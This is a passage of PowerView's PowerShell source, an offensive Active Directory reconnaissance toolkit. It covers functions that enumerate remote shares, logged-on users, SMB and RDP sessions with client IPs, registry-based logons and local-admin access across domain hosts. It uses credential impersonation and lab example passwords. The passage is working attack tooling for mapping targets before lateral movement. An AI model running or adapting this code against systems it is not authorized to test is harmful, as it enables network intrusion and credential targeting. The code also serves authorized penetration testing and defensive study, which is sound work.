                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $Member | Add-Member Noteproperty 'IsDomain' $MemberIsDomain

                        # if ($MemberIsDomain) {
                        #     # translate the binary sid to a string
                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        #     $Member | Add-Member Noteproperty 'Description' ''
                        #     $Member | Add-Member Noteproperty 'Disabled' ''

                        #     if ($IsGroup) {
                        #         $Member | Add-Member Noteproperty 'LastLogin' ''
                        #     }
                        #     else {
                        #         try {
                        #             $Member | Add-Member Noteproperty 'LastLogin' $LocalUser.InvokeGet('LastLogin')
                        #         }
                        #         catch {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ''
                        #         }
                        #     }
                        #     $Member | Add-Member Noteproperty 'PwdLastSet' ''
                        #     $Member | Add-Member Noteproperty 'PwdExpired' ''
                        #     $Member | Add-Member Noteproperty 'UserFlags' ''
                        # }
                        # else {
                        #     # translate the binary sid to a string
                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        #     $Member | Add-Member Noteproperty 'Description' ($LocalUser.Description)

                        #     if ($IsGroup) {
                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ''
                        #         $Member | Add-Member Noteproperty 'PwdExpired' ''
                        #         $Member | Add-Member Noteproperty 'UserFlags' ''
                        #         $Member | Add-Member Noteproperty 'Disabled' ''
                        #         $Member | Add-Member Noteproperty 'LastLogin' ''
                        #     }
                        #     else {
                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ( (Get-Date).AddSeconds(-$LocalUser.PasswordAge[0]))
                        #         $Member | Add-Member Noteproperty 'PwdExpired' ( $LocalUser.PasswordExpired[0] -eq '1')
                        #         $Member | Add-Member Noteproperty 'UserFlags' ( $LocalUser.UserFlags[0] )
                        #         # UAC flags of 0x2 mean the account is disabled
                        #         $Member | Add-Member Noteproperty 'Disabled' $(($LocalUser.UserFlags.value -band 2) -eq 2)
                        #         try {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ( $LocalUser.LastLogin[0])
                        #         }
                        #         catch {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ''
                        #         }
                        #     }
                        # }

                        $Member
                    }
                }
                catch {
                    Write-Verbose "[Get-NetLocalGroupMember] Error for $Computer : $_"
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetShare {
<#
.SYNOPSIS

Returns open shares on the local (or a remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetShareEnum Win32API call to query
a given host for open shares. This is a replacement for "net share \\hostname".

.PARAMETER ComputerName

Specifies the hostname to query for shares (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetShare

Returns active shares on the local host.

.EXAMPLE

Get-NetShare -ComputerName sqlserver

Returns active shares on the 'sqlserver' host

.EXAMPLE

Get-DomainComputer | Get-NetShare

Returns all shares for all computers in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetShare -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.ShareInfo

A PSCustomObject representing a SHARE_INFO_1 structure, including
the name/type/remark for each share, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # arguments for NetShareEnum
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # get the raw share information
            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # locate the offset of the initial intPtr
            $Offset = $PtrInfo.ToInt64()

            # 0 = success
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                $Increment = $SHARE_INFO_1::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SHARE_INFO_1

                    # return all the sections of the structure - have to do it this way for V2
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $Computer
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Share
                }

                # free up the result buffer
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLoggedon {
<#
.SYNOPSIS

Returns users logged on the local (or a remote) machine.
Note: administrative rights needed for newer Windows OSes.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetWkstaUserEnum Win32API call to query
a given host for actively logged on users.

.PARAMETER ComputerName

Specifies the hostname to query for logged on users (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetLoggedon

Returns users actively logged onto the local host.

.EXAMPLE

Get-NetLoggedon -ComputerName sqlserver

Returns users actively logged onto the 'sqlserver' host.

.EXAMPLE

Get-DomainComputer | Get-NetLoggedon

Returns all logged on users for all computers in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetLoggedon -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.LoggedOnUserInfo

A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
the UserName/LogonDomain/AuthDomains/LogonServer for each user, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # declare the reference variables
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # get logged on user information
            $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # locate the offset of the initial intPtr
            $Offset = $PtrInfo.ToInt64()

            # 0 = success
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                $Increment = $WKSTA_USER_INFO_1::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WKSTA_USER_INFO_1

                    # return all the sections of the structure - have to do it this way for V2
                    $LoggedOn = $Info | Select-Object *
                    $LoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                    $LoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $LoggedOn
                }

                # free up the result buffer
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetSession {
<#
.SYNOPSIS

Returns session information for the local (or a remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetSessionEnum Win32API call to query
a given host for active sessions.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetSession

Returns active sessions on the local host.

.EXAMPLE

Get-NetSession -ComputerName sqlserver

Returns active sessions on the 'sqlserver' host.

.EXAMPLE

Get-DomainController | Get-NetSession

Returns active sessions on all domain controllers.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetSession -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.SessionInfo

A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
the CName/UserName/Time/IdleTime for each session, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # arguments for NetSessionEnum
            $QueryLevel = 10
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # get session information
            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # locate the offset of the initial intPtr
            $Offset = $PtrInfo.ToInt64()

            # 0 = success
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                $Increment = $SESSION_INFO_10::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SESSION_INFO_10

                    # return all the sections of the structure - have to do it this way for V2
                    $Session = $Info | Select-Object *
                    $Session | Add-Member Noteproperty 'ComputerName' $Computer
                    $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Session
                }

                # free up the result buffer
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }


    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-RegLoggedOn {
<#
.SYNOPSIS

Returns who is logged onto the local (or a remote) machine
through enumeration of remote registry keys.

Note: This function requires only domain user rights on the
machine you're enumerating, but remote registry must be enabled.

Author: Matt Kelly (@BreakersAll)  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, ConvertFrom-SID  

.DESCRIPTION

This function will query the HKU registry values to retrieve the local
logged on users SID and then attempt and reverse it.
Adapted technique from Sysinternal's PSLoggedOn script. Benefit over
using the NetWkstaUserEnum API (Get-NetLoggedon) of less user privileges
required (NetWkstaUserEnum requires remote admin access).

.PARAMETER ComputerName

Specifies the hostname to query for remote registry values (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-RegLoggedOn

Returns users actively logged onto the local host.

.EXAMPLE

Get-RegLoggedOn -ComputerName sqlserver

Returns users actively logged onto the 'sqlserver' host.

.EXAMPLE

Get-DomainController | Get-RegLoggedOn

Returns users actively logged on all domain controllers.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-RegLoggedOn -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.RegLoggedOnUser

A PSCustomObject including the UserDomain/UserName/UserSID of each
actively logged on user, with the ComputerName added.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost'
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                # retrieve HKU remote registry values
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$ComputerName")

                # sort out bogus sid's like _class
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $UserName = ConvertFrom-SID -ObjectSID $_ -OutputType 'DomainSimple'

                    if ($UserName) {
                        $UserName, $UserDomain = $UserName.Split('@')
                    }
                    else {
                        $UserName = $_
                        $UserDomain = $Null
                    }

                    $RegLoggedOnUser = New-Object PSObject
                    $RegLoggedOnUser | Add-Member Noteproperty 'ComputerName' "$ComputerName"
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserName' $UserName
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserSID' $_
                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $RegLoggedOnUser
                }
            }
            catch {
                Write-Verbose "[Get-RegLoggedOn] Error opening remote registry on '$ComputerName' : $_"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetRDPSession {
<#
.SYNOPSIS

Returns remote desktop/session information for the local (or a remote) machine.

Note: only members of the Administrators or Account Operators local group
can successfully execute this functionality on a remote target.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the WTSEnumerateSessionsEx and WTSQuerySessionInformation
Win32API calls to query a given RDP remote service for active sessions and originating
IPs. This is a replacement for qwinsta.

.PARAMETER ComputerName

Specifies the hostname to query for active sessions (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetRDPSession

Returns active RDP/terminal sessions on the local host.

.EXAMPLE

Get-NetRDPSession -ComputerName "sqlserver"

Returns active RDP/terminal sessions on the 'sqlserver' host.

.EXAMPLE

Get-DomainController | Get-NetRDPSession

Returns active RDP/terminal sessions on all domain controllers.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetRDPSession -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.RDPSessionInfo

A PSCustomObject representing a combined WTS_SESSION_INFO_1 and WTS_CLIENT_ADDRESS structure,
with the ComputerName added.

.LINK

https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
#>

    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            # open up a handle to the Remote Desktop Session host
            $Handle = $Wtsapi32::WTSOpenServerEx($Computer)

            # if we get a non-zero handle back, everything was successful
            if ($Handle -ne 0) {

                # arguments for WTSEnumerateSessionsEx
                $ppSessionInfo = [IntPtr]::Zero
                $pCount = 0

                # get information on all current sessions
                $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # locate the offset of the initial intPtr
                $Offset = $ppSessionInfo.ToInt64()

                if (($Result -ne 0) -and ($Offset -gt 0)) {

                    # work out how much to increment the pointer by finding out the size of the structure
                    $Increment = $WTS_SESSION_INFO_1::GetSize()

                    # parse all the result structures
                    for ($i = 0; ($i -lt $pCount); $i++) {

                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                        $RDPSession = New-Object PSObject

                        if ($Info.pHostName) {
                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            # if no hostname returned, use the specified hostname
                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Computer
                        }

                        $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            # if a domain isn't returned just use the username
                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
                        $RDPSession | Add-Member Noteproperty 'State' $Info.State

                        $ppBuffer = [IntPtr]::Zero
                        $pBytesReturned = 0

                        # query for the source client IP with WTSQuerySessionInformation
                        #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                        $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
                        }
                        else {
                            $Offset2 = $ppBuffer.ToInt64()
                            $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                            $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                            $SourceIP = $Info2.Address
                            if ($SourceIP[2] -ne 0) {
                                $SourceIP = [String]$SourceIP[2]+'.'+[String]$SourceIP[3]+'.'+[String]$SourceIP[4]+'.'+[String]$SourceIP[5]
                            }
                            else {
                                $SourceIP = $Null
                            }

                            $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP
                            $RDPSession.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $RDPSession

                            # free up the memory buffer
                            $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                            $Offset += $Increment
                        }
                    }
                    # free up the memory result buffer
                    $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                # close off the service handle
                $Null = $Wtsapi32::WTSCloseServer($Handle)
            }
            else {
                Write-Verbose "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Test-AdminAccess {
<#
.SYNOPSIS

Tests if the current user has administrative access to the local (or a remote) machine.

Idea stolen from the local_admin_search_enum post module in Metasploit written by:  
    'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'  
    'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'  
    'Royce Davis "r3dy" <rdavis[at]accuvant.com>'  

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will use the OpenSCManagerW Win32API call to establish
a handle to the remote host. If this succeeds, the current user context
has local administrator acess to the target.

.PARAMETER ComputerName

Specifies the hostname to check for local admin access (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Test-AdminAccess -ComputerName sqlserver

Returns results indicating whether the current user has admin access to the 'sqlserver' host.

.EXAMPLE

Get-DomainComputer | Test-AdminAccess

Returns what machines in the domain the current user has access to.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Test-AdminAccess -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.AdminAccess

A PSCustomObject containing the ComputerName and 'IsAdmin' set to whether
the current user has local admin rights, along with the ComputerName added.

.LINK

https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # 0xF003F - SC_MANAGER_ALL_ACCESS
            #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
            $Handle = $Advapi32::OpenSCManagerW("\\$Computer", 'ServicesActive', 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $IsAdmin = New-Object PSObject
            $IsAdmin | Add-Member Noteproperty 'ComputerName' $Computer

            # if we get a non-zero handle back, everything was successful
            if ($Handle -ne 0) {
                $Null = $Advapi32::CloseServiceHandle($Handle)
                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $False
            }
            $IsAdmin.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $IsAdmin
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetComputerSiteName {
<#
.SYNOPSIS

Returns the AD site where the local (or a remote) machine resides.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will use the DsGetSiteName Win32API call to look up the
name of the site where a specified computer resides.

.PARAMETER ComputerName

Specifies the hostname to check the site for (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local

Returns the site for WINDOWS1.testlab.local.

.EXAMPLE

Get-DomainComputer | Get-NetComputerSiteName

Returns the sites for every machine in AD.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local -Credential $Cred

.OUTPUTS

PowerView.ComputerSite

A PSCustomObject containing the ComputerName, IPAddress, and associated Site name.
#>

    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # if we get an IP address, try to resolve the IP to a hostname
            if ($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $IPAddress = $Computer
                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
            }
            else {
                $IPAddress = @(Resolve-IPAddress -ComputerName $Computer)[0].IPAddress
            }

            $PtrInfo = [IntPtr]::Zero

            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)

            $ComputerSite = New-Object PSObject
            $ComputerSite | Add-Member Noteproperty 'ComputerName' $Computer
            $ComputerSite | Add-Member Noteproperty 'IPAddress' $IPAddress

            if ($Result -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
                $ComputerSite | Add-Member Noteproperty 'SiteName' $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                $ComputerSite | Add-Member Noteproperty 'SiteName' ''
            }
            $ComputerSite.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')

            # free up the result buffer
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)

            $ComputerSite
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-WMIRegProxy {
<#
.SYNOPSIS

Enumerates the proxy server and WPAD conents for the current user.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Enumerates the proxy server and WPAD specification for the current user
on the local machine (default), or a machine specified with -ComputerName.
It does this by enumerating settings from
HKU:SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings.

.PARAMETER ComputerName

Specifies the system to enumerate proxy settings on. Defaults to the local host.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegProxy

ComputerName           ProxyServer            AutoConfigURL         Wpad
------------           -----------            -------------         ----
WINDOWS1               http://primary.test...

.EXAMPLE

$Cred = Get-Credential "TESTLAB\administrator"
Get-WMIRegProxy -Credential $Cred -ComputerName primary.testlab.local

ComputerName            ProxyServer            AutoConfigURL         Wpad
------------            -----------            -------------         ----
windows1.testlab.local  primary.testlab.local

.INPUTS

String

Accepts one or more computer name specification strings  on the pipeline (netbios or FQDN).

.OUTPUTS

PowerView.ProxySettings

Outputs custom PSObjects with the ComputerName, ProxyServer, AutoConfigURL, and WPAD contents.
#>

    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
